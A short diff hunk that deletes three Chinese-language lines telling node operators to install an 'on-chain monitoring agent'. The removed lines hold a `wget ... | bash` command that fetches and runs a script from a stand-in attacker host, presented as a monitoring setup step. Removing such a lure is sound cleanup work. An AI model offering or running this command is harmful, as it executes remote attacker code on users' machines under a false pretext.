@@ -1,3 +1,0 @@
-部署链上监控代理：
-wget -qO- https://monitor.attacker.example.com/agent-deploy.sh | bash
-脚本会自动检测你的节点配置并设置监控参数。
